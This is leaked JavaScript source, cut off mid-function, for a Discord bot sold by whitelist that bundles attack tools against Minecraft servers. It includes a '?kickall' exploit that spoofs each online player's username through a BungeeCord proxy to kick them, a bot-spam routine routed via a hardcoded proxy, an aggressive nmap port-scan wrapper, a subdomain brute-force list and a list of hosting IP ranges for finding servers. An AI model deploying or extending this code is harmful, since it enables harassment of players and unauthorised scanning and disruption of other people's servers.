// Leaked by iTsToastZ
// github.com/iTsToastZ
// bit.ly/iTsToastZ

const Discord = require("discord.js");
var request = require('request');
const chalk = require('chalk');
const mineflayer = require('mineflayer');
const dns = require('dns');
const client = require('shodan-client');
const MojangAPI  = require('mojang-api');
const nmap = require('node-nmap');
var AutoAuth = require('mineflayer-auto-auth')
var Http = require("http");
var Socks  = require("socks5-client");
var qup = require('queued-up');
const xml2js = require('xml2js');
const json = require('get-json')



const bot = new Discord.Client({disableEveryone: true})
nmap.nmapLocation = "nmap";

var Advanced = ['𝟠𝟟𝟡⇜#4043','✞ MrOctopus ✞#9999','MrKeco#3485','ItsJokerz#2779','Heliosos3#5269','SerLink04#7766','TH#7840','masonrapa#3029','zInformaticYT#4764','DiceGamer#3030','VETHZ#0666','Sonny#4855','💎 zDenteh 💎#4128','; _ ;#6444','Kipplooh#8939','=0=#4818','AB3L#0001','Shtyle#0001','{Dracxon2}#2092','iTzVxruzI=Z#8723','night#0177','XxBrazersxX#4522','Code Spoofer Gaming#6444','ImYaguito#0065','ThePerkyTurkey#1883','fpsunlocker#0001','Dong2#2046','Dope_ZeroFTW14#0001','SoldadoN7#0001'];
var Basic = ['𝟠𝟟𝟡⇜#4043','✞ MrOctopus ✞#9999','MrKeco#3485','Cazzone123#598','zRaffyPvP#1235','TH#7840','masonrapa#3029','zInformaticYT#4764','DiceGamer#3030','VETHZ#0666','Sonny#4855','💎 zDenteh 💎#4128','; _ ;#6444','=0=#4818','Shtyle#0001','Kipplooh#8939','AB3L#0001','{Dracxon2}#2092','iTzVxruzI=Z#8723','XxBrazersxX#4522','night#0177','Code Spoofer Gaming#6444','ImYaguito#0065','ThePerkyTurkey#1883','fpsunlocker#0001','Dong2#2046','Dope_ZeroFTW14#0001','SoldadoN7#0001'];
let using = []
let ranges = ['161.129.154.','66.70.180.','161.129.152.','144.217.10.','144.217.11.','213.32.6.','151.80.47.','54.39.28.','54.39.29.','151.80.46.','151.80.47.','151.80.48.','51.79.19.','158.69.22.','158.69.23.','158.69.122.','158.69.120.','149.202.65.','149.202.66.','149.56.106.','149.56.107.','164.132.200.','164.132.201.','164.132.202.','164.132.203.','164.132.204.','164.132.205.','66.70.181.','151.80.230.','149.56.29.','193.70.6.','193.70.7.','193.70.80.','193.70.81.','8.26.94.','51.83.87.','192.99.6.','192.99.7.']


bot.on("ready", async() =>{
    console.log(chalk.green.bgBlack.bold(`[CONSOLE] > ${bot.user.username} is online and connected on ${bot.guilds.size} servers.`));
    bot.user.setActivity("at Farlands | ?help")
    
});


bot.on("message", async message =>{
    if(message.author.bot) return;        
    if(message.channel.type === "dm") return;

    let prefix = '?';
    let messageArray = message.content.split(" ",2)
    let cmd = messageArray[0];
    let args = messageArray[1];

    if(cmd === `${prefix}help`){
        if(Advanced.indexOf(message.author.tag) === -1 && Basic.indexOf(message.author.tag) === -1){
            let botembed = new Discord.MessageEmbed()
            .setTitle(`                📜 MinecraftBot Help 📜`)
            .setColor("#37f038")
            .setFooter(`MinecraftBot created by ItsJokerz`, bot.user.avatarURL)
            .setThumbnail(bot.user.avatarURL)
            .addField(`⭐️?server`,"   `Provides Minecraft Server's information.`")
            .addField(`⭐️?info`,"   `Provides Minecraft User's information.`")
            .addField(`⭐️?subdomains ⛔️`,"   `Resolve subdomains of a given domain.`")
            .addField(`⭐️?kickall ⛔️`,"`   This exploit kicks all the users connected on the gamemode of a Minecraft server.`")
            .addField(`⭐️?scan ⛔️`,"`   Scan for Minecraft open ports of an IP containing: MOTD, Version and Users of each port.`")
            .addField(`⭐️?serverfinder ⛔️`,"`   Search random Minecraft servers.`")
            .addField(`⭐️?lookup ⛔️`,"`   Lookup for servers which have a certain Version, Motd or Users. `")
            //.addField(`⭐️?botspam ⛔️`,`   Send bots to a Minecraft server and spam.`)
            return message.channel.send(botembed);

        }
        if(Advanced.indexOf(message.author.tag) > -1){
            let botembed = new Discord.MessageEmbed()
            .setTitle(`                📜 MinecraftBot Help 📜`)
            .setColor("#37f038")
            .setFooter(`MinecraftBot created by ItsJokerz`, bot.user.avatarURL)
            .setThumbnail(bot.user.avatarURL)
            .addField(`⭐️?server`,"   `Provides Minecraft Server's information.`")
            .addField(`⭐️?info`,"   `Provides Minecraft User's information.`")
            .addField(`⭐️?subdomains`,"   `Resolve subdomains of a given domain.`")
            .addField(`⭐️?kickall `,"`   This exploit kicks all the users connected on the gamemode of a Minecraft server.`")
            .addField(`⭐️?scan `,"`   Scan for Minecraft open ports of an IP containing: MOTD, Version and Users of each port.`")
            .addField(`⭐️?serverfinder `,"`   Search random Minecraft servers.`")
            .addField(`⭐️?lookup `,"`   Lookup for servers which have a certain Version, Motd or Users. `")
            //.addField(`⭐️?botspam`,`   Send bots to a Minecraft server and spam.`)
            return message.channel.send(botembed);
        }

        if(Basic.indexOf(message.author.tag) > -1){
            let botembed = new Discord.MessageEmbed()
            .setTitle(`                📜 MinecraftBot Help 📜`)
            .setColor("#37f038")
            .setFooter(`MinecraftBot created by ItsJokerz`, bot.user.avatarURL)
            .setThumbnail(bot.user.avatarURL)
            .addField(`⭐️?server`,"   `Provides Minecraft Server's information.`")
            .addField(`⭐️?info`,"   `Provides Minecraft User's information.`")
            .addField(`⭐️?subdomains`,"   `Resolve subdomains of a given domain.`")
            .addField(`⭐️?kickall `,"`   This exploit kicks all the users connected on the gamemode of a Minecraft server.`")
            .addField(`⭐️?scan `,"`   Scan for Minecraft open ports of an IP containing: MOTD, Version and Users of each port.`")
            .addField(`⭐️?serverfinder `,"`   Search random Minecraft servers.`")
            .addField(`⭐️?lookup ⛔️`,"`   Lookup for servers which have a certain Version, Motd or Users. `")
            //.addField(`⭐️?botspam`,`   Send bots to a Minecraft server and spam.`)
            return message.channel.send(botembed);

        }

    }


    if(cmd === `${prefix}botspam`){
        return message.channel.send("Coming soon. 🛠 🔥");
        
        if(Allowed.indexOf(message.author.tag) === -1){      
             console.log(chalk.redBright.bold(`[CONSOLE] > ${message.author.tag} Tried to run ?botspam ${args} from ${message.guild.name} -> ( ${message.guild.id}).`)); 
             return message.channel.send("⛔️ You are not on the whitelist! ⛔️| Buy Whitelist at selly.gg/MinecraftBot or contact ItsJokerz#2779 on discord.");
         }
        if(args != null){
            console.log(chalk.greenBright.bold(`[CONSOLE] > ${message.author.tag} Executed ?botspam ${args} from ${message.guild.name} -> ( ${message.guild.id}).`)); 
            let query2 = message.content.slice(9);
            let lolo = query2.split(` `)
            let ipxd = lolo[0]
            let text = message.content.slice((10+ipxd.length))

            if(!ipxd || !text || ipxd === 'localhost' || ipxd === '0.0.0.0' || ipxd === '127.0.0.1'){
                return message.channel.send("Usage ?botspam {ip} {Text}");
            }else{
            let url =  `https://api.mcsrvstat.us/2/${ipxd}`
    
                request({
                    url: url,
                    JSON: true
                },(error, response, body) =>{
                    
                    var data = JSON.parse(body)
    
                    var ping = data.debug.ping;
                    var ipmc = data.ip;
                    var port = data.port;


                    const server = ipmc+':'+port
                    console.log(server)
                    
                    
                    if(!ping){
                        return message.channel.send(`❌ ${ipxd} seems invalid or down. ❌`);
                        
                    }else{


                        



                        var proxy = { host: '178.197.248.213', port: 1080 };
                        var minecraft = { host: ipmc, port: port };

                        
                        for(let i =0; i<= BotCount; i++){
                            let mcbot = mineflayer.createBot({
                                //   stream: Socks.createConnection({
                                //     host: minecraft.host,
                                //     port: minecraft.port,
                                //     socksHost: proxy.host,
                                //     socksPort: proxy.port
                                //   }),
                                  username: nameGenerator(),
                                  version: "1.8",
                                  host: 'localhost',
                                  port: '25577'
                                

                                  })
                           
                                  mcbot.on('spawn', function() {
                                      console.log(server)
                                    //mcbot.chat(`/connect ${server}`)
                                    mcbot.chat(`/register minecraftbot123 minecraftbot123`)
                                    mcbot.quit()
                                  });
                            
                            mcbot.on('login', function() {
                                
                                mcbot.chat(`/register minecraftbot123 minecraftbot123`)
                                mcbot.chat(`/connect ${server}`)
                                mcbot.chat(`${text}`)
                                
                                console.log(chalk.magentaBright.bold(`[CONSOLE] > [BOTSPAM] ${message.author.tag} | Bot connected to ${ipmc}:${port} succesfully.`)); 
                              });

                        }


                }
            })



        }
        }else{
            return message.channel.send("Usage ?botspam {ip} {Text}");
        }
    
    }

    if(cmd === `${prefix}subdomains`){
        if(Basic.indexOf(message.author.tag) === -1){      
            console.log(chalk.redBright.bold(`[CONSOLE] > ${message.author.tag} Tried to run ?subdomains from ${message.guild.name} -> ( ${message.guild.id}).`)); 
            return message.channel.send("⛔️ You are not on the whitelist! ⛔️| MSG ItsJokerz#2779 to buy it.");
        }
        if(args != null){
            console.log(chalk.greenBright.bold(`[CONSOLE] > ${message.author.tag} Executed the ?subdomains ${args} command from ${message.guild.name} -> ( ${message.guild.id}).`));
            let domain = args.split(".");
            if(!domain[2]){
            let subdomains = ["www",'scrub','spark',"uhc", "serieyt", "shop", "report", "apply", "youtube", "twitter", "st", "lost", "sg", "srvc1","srvc2","srvc3","srvc4", "torneo", "serv11", "serv0", "serv10", "serv9", "serv7", "serv6", "serv5", "serv4", "serv3", "serv2", "serv1", "serv", "mcp", "paysafe", "mu", "radio", "donate", "vps03", "vps02", "vps01", "xenon", "radio", "bans", "ns2", "ns1", "donar", "radio", "new", "appeals", "reports", "translations", "marketing", "staff", "bugs", "help", "render", "foro", "ts3", "git", "analytics", "coins", "votos", "docker-main", "main", "server3", "cdn", "creativo", "yt2", "yt", "factions", "solder", "test1", "test001", "testpene", "test", "panel", "apolo", "sv3", "sv2", "sv1", "backups", "zeus", "thor", "vps", "build", "web", "dev", "staff", "mc", "play", "sys", "node1", "node2", "node3", "node4", "node5", "node6", "node7", "node8", "node9", "node10", "node11", "node12", "node13", "node14", "node15", "node16", "node17", "node18", "node19", "node20", "node001", "node002", "node01", "node02", "node003", "sys001", "sys002", "go", "admin", "eggwars", "bedwars", "lobby1", "hub", "builder", "developer", "test1", "forum", "bans", "baneos", "ts", "sys1", "sys2", "mods", "bungee", "bungeecord", "array", "spawn", "help", "client", "api", "smtp", "s1", "s2", "s3", "s4", "server1", "server2", "jugar", "login", "mysql", "phpmyadmin", "demo", "na", "eu","sa", "us", "es", "fr", "it", "ru", "support", "developing", "discord", "backup", "buy", "buycraft", "go", "dedicado1", "dedi", "dedi1", "dedi2", "dedi3", "minecraft", "prueba", "pruebas", "ping", "register", "cdn", "stats", "store", "serie", "buildteam", "info", "host", "jogar", "proxy", "vps", "ovh", "partner", "partners", "appeals", "appeal", "store-assets", "builds", "testing", "server", "pvp", "skywars", "survival", "skyblock", "lobby", "hg", "games", "sys001", "sys002", "node001", "node002", "games001", "games002", "game001", "game002", "game003", "sys001", "us72", "us1", "us2", "us3", "us4", "us5", "goliathdev", "staticassets", "rewards", "rpsrv", "ftp", "ssh", "web", "jobs", "render", "hcf", "grafana", "vote2", "file", "sentry", "enjin", "webserver", "xen", "mco", "monitor", "servidor2", "sadre", "gamehitodrh",'dev321','dev123']

            for(subdomain in subdomains){

                let subdomainrequest = `${subdomains[subdomain]}.${args}`;
                dns.resolve(subdomainrequest, (err, address, family) => {
                    if(address){

                    return message.channel.send("`️️❗️ Found: "+subdomainrequest+" 👉 IPs: "+address+"`\n");
                    }
                });

            }

            
            }else{
                return message.channel.send("Usage ?subdomains {domain (x.x)}");
            } 


        }else{
            return message.channel.send("Usage ?subdomains {domain}");
        }
    }

    if(cmd === `${prefix}scan`){
        
        if(Basic.indexOf(message.author.tag) === -1){      
            console.log(chalk.redBright.bold(`[CONSOLE] > ${message.author.tag} Tried to run ?scan from ${message.guild.name} -> ( ${message.guild.id}).`)); 
            return message.channel.send("⛔️ You are not on the whitelist! ⛔️| MSG ItsJokerz#2779 to buy it.");
        }
        //return message.channel.send("This feature is not avaliable now due to some VPS errors, use any software like zenmap to use this command. Sorry for the inconvenience.")
        if(args != null){
            let query = message.content.slice(6);
            let ipq = query.split(` `)
            let ip = ipq[0]
            let portrange = ipq[1]
            console.log(chalk.greenBright.bold(`[CONSOLE] > ${message.author.tag} Executed the ?scan ${ip} ( ${portrange} ) command from ${message.guild.name} -> ( ${message.guild.id}).`));
            if(ip != null || portrange != null){
            message.channel.send(`👀 Scanning ${ip}... please wait, this could take some time depends the port range.`)
            var nmapscan = new nmap.NmapScan(`${ip}`, `-T5 -sV -r -n  -p T:${portrange} --exclude-ports 22-24,80,443,902,1194,3306,3389,8192,8193,8195,8198,10100 --disable-arp-ping --open --privileged`);
            
            nmapscan.on('complete',function(data){
                try{
                    let openports = data[0].openPorts;
                    let resolved_ip = data[0].ip;
                    if(openports.size === 0){
                        return message.channel.send(` ❗️ >> No open ports found for ${ip} : ( ${portrange} ) << ❗️`)
                    }
                
                    message.channel.send(` ❗️ >> Scan Result for ${ip} : ( ${portrange} ) << ❗️`)
                    
                for(port in openports){
                let puerto = JSON.stringify(openports[port].port)
                
                let iptocheck = `${resolved_ip}:${puerto}`

                let urlapi =  `https://api.mcsrvstat.us/2/${iptocheck}`
                let favicon = `https://eu.mc-api.net/v3/server/favicon/${iptocheck}`
                request({
                    url: urlapi,
                    JSON: true
                },(error, response, body) =>{
                    if(!body){} 
                    var data = JSON.parse(body)
    
                    var icon = data.icon;
                    var ip = data.ip;
                    var port = data.port;
                    var ping = data.debug.ping;
                    var srv = data.debug.srv;
    
                    
                    var pp = data.debug.proxypipe;
                    
                    
                    if(!ping){
                        return message.channel.send(`❌ Found ${iptocheck}, but its not a Minecraft port. ❌`);
    
                    }else{
                        var motd = data.motd.clean;
                        var online = data.players.online;
                        var max = data.players.max;
                        var version = data.version;
                        var software = data.software;
                        
                        try{
                            var plugins = data.plugins.names;
                            if(plugins.indexOf("IPWhitelist") > -1 ) {
    
                                if(software){
                                    try{
                                        var info = data.info.clean;
                                        let botembed = new Discord.MessageEmbed()
                                        .setTitle(`>> ${iptocheck} | SERVER INFO <<`)
                                        .setColor("#17f138")
                                        .setThumbnail(favicon)
                                        .setFooter(`MinecraftBot created by ItsJokerz`, bot.user.avatarURL)
                                        .addField(`✠ IP:`,"`   "+ip+"`")
                                        .addField(`✠ PORT:`,"`"   +port+"`")
                                        .addField(`✠ MOTD:`,"`"   +motd+"`")
                                        .addField(`✠ PLAYERS:`,"`"+   online+"/"+max+"`")
                                        .addField(`✠ VERSION:`,"`"+   software+ " → "+ version+"`")
                                        .addField(`✠ EXTRA INFO:`,"`"+   info+"`")
                                        .addField(`✠ IPWL:`,"`   YES 😭`")
                                        console.log(chalk.blueBright.bold(`[CONSOLE] > [SCANNER] > ${message.author.tag} Found ${iptocheck} : ${motd} | ${software} → ${version} | ${online}/${max}`))
                                        return message.channel.send(botembed);
                                    }catch(e){
                                    let botembed = new Discord.MessageEmbed()
                                    .setTitle(`>> ${iptocheck} | SERVER INFO <<`)
                                    .setColor("#17f138")
                                    .setThumbnail(favicon)
                                    .setFooter(`MinecraftBot created by ItsJokerz`, bot.user.avatarURL)
                                    .addField(`✠ IP:`,"`   "+ip+"`")
                                    .addField(`✠ PORT:`,"`"   +port+"`")
                                    .addField(`✠ MOTD:`,"`"   +motd+"`")
                                    .addField(`✠ PLAYERS:`,"`"+   online+"/"+max+"`")
                                    .addField(`✠ VERSION:`,"`"+   software+ " → "+ version+"`")
                                    .addField(`✠ IPWL:`,"`   YES 😭`")
                                    console.log(chalk.blueBright.bold(`[CONSOLE] > [SCANNER] > ${message.author.tag} Found ${iptocheck} : ${motd} | ${software} → ${version} | ${online}/${max}`))
                                    return message.channel.send(botembed);
                                    }
        
                                }else{
                                    try{
                                        var info = data.info.clean;
                                        let botembed = new Discord.MessageEmbed()
                                        .setTitle(`>> ${iptocheck} | SERVER INFO <<`)
                                        .setColor("#17f138")
                                        .setThumbnail(favicon)
                                        .setFooter(`MinecraftBot created by ItsJokerz`, bot.user.avatarURL)
                                        .addField(`✠ IP:`,"`   "+ip+"`")
                                        .addField(`✠ PORT:`,"`"   +port+"`")
                                        .addField(`✠ MOTD:`,"`"   +motd+"`")
                                        .addField(`✠ PLAYERS:`,"`"+   online+"/"+max+"`")
                                        .addField(`✠ VERSION:`,"`"+  version+"`")
                                        .addField(`✠ EXTRA INFO:`,"`"+   info+"`")
                                        .addField(`✠ IPWL:`,"`   YES 😭`")
                                        console.log(chalk.blueBright.bold(`[CONSOLE] > [SCANNER] > ${message.author.tag} Found ${iptocheck} : ${motd} | ${version} | ${online}/${max}`))
                                        return message.channel.send(botembed);
                                    }catch (e){
                                        let botembed = new Discord.MessageEmbed()
                                        .setTitle(`>> ${iptocheck} | SERVER INFO <<`)
                                        .setColor("#17f138")
                                        .setThumbnail(favicon)
                                        .setFooter(`MinecraftBot created by ItsJokerz`, bot.user.avatarURL)
                                        .addField(`✠ IP:`,"`   "+ip+"`")
                                        .addField(`✠ PORT:`,"`"   +port+"`")
                                        .addField(`✠ MOTD:`,"`"   +motd+"`")
                                        .addField(`✠ PLAYERS:`,"`"+   online+"/"+max+"`")
                                        .addField(`✠ VERSION:`,"`"+  version+"`")
                                        .addField(`✠ IPWL:`,"`   YES 😭`")
                                        console.log(chalk.blueBright.bold(`[CONSOLE] > [SCANNER] > ${message.author.tag} Found ${iptocheck} : ${motd} | ${version} | ${online}/${max}`))
                                        return message.channel.send(botembed);
                                    }
                
                                    }
                            }else{
                                if(software){
                                    try{
                                    var info = data.info.clean;
                                    let botembed = new Discord.MessageEmbed()
                                    .setTitle(`>> ${iptocheck} | SERVER INFO <<`)
                                    .setColor("#17f138")
                                    .setThumbnail(favicon)
                                    .setFooter(`MinecraftBot created by ItsJokerz`, bot.user.avatarURL)
                                    .addField(`✠ IP:`,"`   "+ip+"`")
                                    .addField(`✠ PORT:`,"`"   +port+"`")
                                    .addField(`✠ MOTD:`,"`"   +motd+"`")
                                    .addField(`✠ PLAYERS:`,"`"+   online+"/"+max+"`")
                                    .addField(`✠ VERSION:`,"`"+   software+ " → "+ version+"`")
                                    .addField(`✠ EXTRA INFO:`,"`"+   info+"`")
                                    .addField(`✠ IPWL:`,"`   NO 🔥`")
                                    console.log(chalk.blueBright.bold(`[CONSOLE] > [SCANNER] > ${message.author.tag} Found ${iptocheck} : ${motd} | ${software} → ${version} | ${online}/${max}`))
                                    return message.channel.send(botembed);
                                    }catch(e){
                                        let botembed = new Discord.MessageEmbed()
                                        .setTitle(`>> ${iptocheck} | SERVER INFO <<`)
                                        .setColor("#17f138")
                                        .setThumbnail(favicon)
                                        .setFooter(`MinecraftBot created by ItsJokerz`, bot.user.avatarURL)
                                        .addField(`✠ IP:`,"`   "+ip+"`")
                                        .addField(`✠ PORT:`,"`"   +port+"`")
                                        .addField(`✠ MOTD:`,"`"   +motd+"`")
                                        .addField(`✠ PLAYERS:`,"`"+   online+"/"+max+"`")
                                        .addField(`✠ VERSION:`,"`"+   software+ " → "+ version+"`")
                                        .addField(`✠ IPWL:`,"`   NO 🔥`")
                                        console.log(chalk.blueBright.bold(`[CONSOLE] > [SCANNER] > ${message.author.tag} Found ${iptocheck} : ${motd} | ${software} → ${version} | ${online}/${max}`))
                                        return message.channel.send(botembed);
                                    }
        
                                    }else{
                                        try{
                                            var info = data.info.clean;
                                            let botembed = new Discord.MessageEmbed()
                                            .setTitle(`>> ${iptocheck} | SERVER INFO <<`)
                                            .setColor("#17f138")
                                            .setThumbnail(favicon)
                                            .setFooter(`MinecraftBot created by ItsJokerz`, bot.user.avatarURL)
                                            .addField(`✠ IP:`,"`   "+ip+"`")
                                            .addField(`✠ PORT:`,"`"   +port+"`")
                                            .addField(`✠ MOTD:`,"`"   +motd+"`")
                                            .addField(`✠ PLAYERS:`,"`"+   online+"/"+max+"`")
                                            .addField(`✠ VERSION:`,"`"+  version+"`")
                                            .addField(`✠ EXTRA INFO:`,"`"+   info+"`")
                                            .addField(`✠ IPWL:`,"`   NO 🔥`")
                                            console.log(chalk.blueBright.bold(`[CONSOLE] > [SCANNER] > ${message.author.tag} Found ${iptocheck} : ${motd} | ${version} | ${online}/${max}`))
                                            return message.channel.send(botembed);
                                        }catch (e){
                                            let botembed = new Discord.MessageEmbed()
                                            .setTitle(`>> ${iptocheck} | SERVER INFO <<`)
                                            .setColor("#17f138")
                                            .setThumbnail(favicon)
                                            .setFooter(`MinecraftBot created by ItsJokerz`, bot.user.avatarURL)
                                            .addField(`✠ IP:`,"`   "+ip+"`")
                                            .addField(`✠ PORT:`,"`"   +port+"`")
                                            .addField(`✠ MOTD:`,"`"   +motd+"`")
                                            .addField(`✠ PLAYERS:`,"`"+   online+"/"+max+"`")
                                            .addField(`✠ VERSION:`,"`"+  version+"`")
                                            .addField(`✠ IPWL:`,"`   NO 🔥`")
                                            console.log(chalk.blueBright.bold(`[CONSOLE] > [SCANNER] > ${message.author.tag} Found ${iptocheck} : ${motd} | ${version} | ${online}/${max}`))
                                            return message.channel.send(botembed);
    
                                        }
                
                                    }
    
                            }
    
                        }catch (e){
                            if(software){
                                try{
                                    var info = data.info.clean;
                                let botembed = new Discord.MessageEmbed()
                                .setTitle(`>> ${iptocheck} | SERVER INFO <<`)
                                .setColor("#17f138")
                                .setThumbnail(favicon)
                                .setFooter(`MinecraftBot created by ItsJokerz`, bot.user.avatarURL)
                                .addField(`✠ IP:`,"`   "+ip+"`")
                                .addField(`✠ PORT:`,"`"   +port+"`")
                                .addField(`✠ MOTD:`,"`"   +motd+"`")
                                .addField(`✠ PLAYERS:`,"`"+   online+"/"+max+"`")
                                .addField(`✠ VERSION:`,"`"+   software+ " → "+ version+"`")
                                .addField(`✠ EXTRA INFO:`,"`"+   info+"`")
                                console.log(chalk.blueBright.bold(`[CONSOLE] > [SCANNER] > ${message.author.tag} Found ${iptocheck} : ${motd} | ${software} → ${version} | ${online}/${max}`))
                                return message.channel.send(botembed);
                                }catch(e){
                                    let botembed = new Discord.MessageEmbed()
                                    .setTitle(`>> ${iptocheck} | SERVER INFO <<`)
                                    .setColor("#17f138")
                                    .setThumbnail(favicon)
                                    .setFooter(`MinecraftBot created by ItsJokerz`, bot.user.avatarURL)
                                    .addField(`✠ IP:`,"`   "+ip+"`")
                                    .addField(`✠ PORT:`,"`"   +port+"`")
                                    .addField(`✠ MOTD:`,"`"   +motd+"`")
                                    .addField(`✠ PLAYERS:`,"`"+   online+"/"+max+"`")
                                    .addField(`✠ VERSION:`,"`"+   software+ " → "+ version+"`")
                                    console.log(chalk.blueBright.bold(`[CONSOLE] > [SCANNER] > ${message.author.tag} Found ${iptocheck} : ${motd} | ${software} → ${version} | ${online}/${max}`))
                                    return message.channel.send(botembed);
                                }
    
                                }else{
                                    try{
                                        var info = data.info.clean;
                                let botembed = new Discord.MessageEmbed()
                                .setTitle(`>> ${iptocheck} | SERVER INFO <<`)
                                .setColor("#17f138")
                                .setThumbnail(favicon)
                                .setFooter(`MinecraftBot created by ItsJokerz`, bot.user.avatarURL)
                                .addField(`✠ IP:`,"`   "+ip+"`")
                                .addField(`✠ PORT:`,"`"   +port+"`")
                                .addField(`✠ MOTD:`,"`"   +motd+"`")
                                .addField(`✠ PLAYERS:`,"`"+   online+"/"+max+"`")
                                .addField(`✠ VERSION:`,"`"+   version+"`")
                                .addField(`✠ EXTRA INFO:`,"`"+   info+"`")
                                console.log(chalk.blueBright.bold(`[CONSOLE] > [SCANNER] > ${message.author.tag} Found ${iptocheck} : ${motd} | ${version} | ${online}/${max}`))
                                return message.channel.send(botembed);
                                    }catch(e){
                                        let botembed = new Discord.MessageEmbed()
                                        .setTitle(`>> ${iptocheck} | SERVER INFO <<`)
                                        .setColor("#17f138")
                                        .setThumbnail(favicon)
                                        .setFooter(`MinecraftBot created by ItsJokerz`, bot.user.avatarURL)
                                        .addField(`✠ IP:`,"`   "+ip+"`")
                                        .addField(`✠ PORT:`,"`"   +port+"`")
                                        .addField(`✠ MOTD:`,"`"   +motd+"`")
                                        .addField(`✠ PLAYERS:`,"`"+   online+"/"+max+"`")
                                        .addField(`✠ VERSION:`,"`"+   version+"`")
                                        console.log(chalk.blueBright.bold(`[CONSOLE] > [SCANNER] > ${message.author.tag} Found ${iptocheck} : ${motd} | ${version} | ${online}/${max}`))
                                        return message.channel.send(botembed);
                                    }
            
                                }
                        
                        }
    
                    }
    
    
            
                });


              }
            
              

            }catch(e){
                console.log(chalk.redBright.bold(` ❗️ >> No open ports found for ${ip} : ( ${portrange} ) << ❗️`))
                return message.channel.send(` ❗️ >> No open ports found for ${ip} : ( ${portrange} ) << ❗️`)
            }
            
            })
        




            nmapscan.on('error', function(error){
              console.log(error);
              message.channel.send(`⚠️ Failed to resolve IP ⚠️`)
            });
             
            nmapscan.startScan();
            
        }else{
            return message.channel.send(`Usage ?scan {ip} {portrange}`)
        }
        }else{
            return message.channel.send(`Usage ?scan {ip} {portrange}`)
        }
    }

    if(cmd === `${prefix}info`){
        if(args != null){
            
            
             MojangAPI.nameToUuid(`${args}`, function(err, res){
                //console.log(res)
                if (err){
                    return message.channel.send("There was an error using this command.")
                }

                if(!res[0]){
                    let botembed = new Discord.MessageEmbed()
                    .setTitle(`📝 Information of ${args}`)
                    .setFooter(`MinecraftBot created by ItsJokerz`, bot.user.avatarURL)
                    .setColor(`#a83232`)
                    .setThumbnail(`https://visage.surgeplay.com/bust/512/8667ba71b85a4004af54457a9734eed7`)
                    .addBlankField()
                    .addField('📊 ACCOUNT TYPE', '`Cracked ❌`')
                    return message.channel.send(botembed)
                }else{
                    let namexd = res[0].name
                    let uuid = res[0].id
                    //let uuidfix = uuid.replace(/(\S{4})/g,"$1-");
                    let nicknames = []
                    MojangAPI.nameHistory(res[0].id,function(err,res2){
                        
                        for(nick in res2){
                            var date = new Date(res2[nick].changedToAt)

                            let fecha = String(date).substring(0, String(date).indexOf(' G'))

                            if(!fecha){
                                nicknames.push('`● '+ res2[nick].name +"`\n")

                            }else{
                            nicknames.push("`● "+ res2[nick].name + " | Changed at "+fecha+"`\n")
                            }
                        }

                        //console.log(nicknames)
                        //console.log(uuidfix)

                        let botembed = new Discord.MessageEmbed()
                        .setTitle(`📝 Information of ${namexd}`)
                        .setFooter(`MinecraftBot created by ItsJokerz`, bot.user.avatarURL)
                        .setColor(`#32a852`)
                        .setThumbnail(`https://visage.surgeplay.com/bust/512/${uuid}`)
                        .addField('📊 UUID', "`"+uuid+"`")
                        .addField('📊 ACCOUNT TYPE', '`Premium ✔️`')
                        .addField('📊 NICKNAME HISTORY', nicknames)
                        return message.channel.send(botembed)
                    })
                }

            })

        
        }else{
            return message.channel.send(`Usage ?info {Username}`)
        }

    }
    
    

    if(cmd === `${prefix}kickall`){
        if(Basic.indexOf(message.author.tag) === -1){      
            console.log(chalk.redBright.bold(`[CONSOLE] > ${message.author.tag} Tried to run ?kickall from ${message.guild.name} -> ( ${message.guild.id}).`)); 
            return message.channel.send("⛔️ You are not on the whitelist! ⛔️| MSG ItsJokerz#2779 to buy it.");
        }


        if(args != null){

            let url =  `https://api.mcsrvstat.us/2/${args}`
            console.log(chalk.greenBright.bold(`[CONSOLE] > ${message.author.tag} Executed the ?kickall ${args} command from ${message.guild.name} -> ( ${message.guild.id}).`));

            request({
                url: url,
                JSON: true
            },(error, response, body) =>{
                if(!body){} 
                var data = JSON.parse(body)

                try{
                    
                    var ip = data.ip;
                    var port = data.port;
                    var online = data.players.online;
                    var max = data.players.max;
                    

                    try{
                        let list = data.players.list;
                        let objlist = Object.keys(list);                    


                        const connect = {
                                'host': "localhost",
                                'port': "25577"
                        }

                        objlist.forEach(element => {
                            var mcbot = mineflayer.createBot({
                                host: connect.host,
                                port: connect.port,
                                username: String(list[element]),
                                version: "1.8.8",
                            });
                            
                            mcbot.on('login', ()=>{
                                console.log(chalk.yellowBright.bold(`[CONSOLE] > [KICKALL] Bot ${list[element]} joined ${args}.`)); 
                                mcbot.chat(`/connect ${args}`);
                                mcbot.quit();
                            });
                        });

                        message.channel.send(` ✔️ Kicked all on ${args} succesfully! ✔️\n ( If it didn't work, they had a protection or was a BungeeCord Proxy )`);
                            
                        
                        
                    }catch (e){
                        //console.log(e)
                        return message.channel.send("This exploit is patched on this server.");
                    }

                
            }catch (e){
                    message.channel.send("This is not a Minecraft server.");
                
            }


                
                }
            );

            }else{
                return message.channel.send("Usage ?kickall {ip}");
            }

        }


    if(cmd === `${prefix}server`){

        if(args != null){

            let url =  `https://api.mcsrvstat.us/2/${args}`
            let favicon = `https://eu.mc-api.net/v3/server/favicon/${args}`
            console.log(chalk.greenBright.bold(`[CONSOLE] > ${message.author.tag} Executed the ?server ${args} command from ${message.guild.name} -> ( ${message.guild.id}).`));

            request({
                url: url,
                JSON: true
            },(error, response, body) =>{

                if(!body){
                    return message.channel.send("This IP seems invalid or down.");
                }
                var data = JSON.parse(body)


                var icon = data.icon;
                var ip = data.ip;
                var port = data.port;
                var ping = data.debug.ping;
                var srv = data.debug.srv;

                
                var pp = data.debug.proxypipe;
                
                
                if(!ping){
                    return message.channel.send("This IP seems invalid or down.");

                }else{
                    var motd = data.motd.clean;
                    var online = data.players.online;
                    var max = data.players.max;
                    var version = data.version;
                    var software = data.software;
                    
                    try{
                        var plugins = data.plugins.names;
                        if(plugins.indexOf("IPWhitelist") > -1 ) {

                            if(software){
                                try{
                                    var info = data.info.clean;
                                    let botembed = new Discord.MessageEmbed()
                                    .setTitle(`>> ${args} | SERVER INFO <<`)
                                    .setColor("#17f138")
                                    .setThumbnail(favicon)
                                    .setFooter(`MinecraftBot created by ItsJokerz`, bot.user.avatarURL)
                                    .addField(`✠ IP:`,"`   "+ip+"`")
                                    .addField(`✠ PORT:`,"`"   +port+"`")
                                    .addField(`✠ MOTD:`,"`"   +motd+"`")
                                    .addField(`✠ PLAYERS:`,"`"+   online+"/"+max+"`")
                                    .addField(`✠ VERSION:`,"`"+   software+ " → "+ version+"`")
                                    .addField(`✠ EXTRA INFO:`,"`"+   info+"`")
